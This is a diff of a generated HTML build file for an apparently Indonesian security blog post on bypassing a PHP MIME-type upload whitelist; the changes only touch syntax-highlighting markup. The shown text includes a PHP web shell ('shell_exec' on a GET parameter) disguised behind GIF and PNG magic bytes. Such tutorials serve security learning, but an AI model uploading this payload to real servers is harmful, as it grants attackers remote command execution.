@@ -1,4 +1,4 @@
-I"Ð<p>Untuk melakukan upload filter yang dilakukan whitelist dalam bentuk MIME seperti muncul pada code PHP berikut :</p>
+I"2<p>Untuk melakukan upload filter yang dilakukan whitelist dalam bentuk MIME seperti muncul pada code PHP berikut :</p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/gif'</span> <span class="o">&amp;&amp;</span> 
    <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/jpeg'</span> <span class="o">&amp;&amp;</span> 
@@ -39,12 +39,12 @@ lalu bagaimana untuk bypass upload seperti ini.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GIF89</span>
 
-<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">'cmd'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="nf">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
 </code></pre></div></div>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">PNG</span>
 
-<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">'cmd'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="nf">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
 </code></pre></div></div>
 
 <p>so lets try it</p>
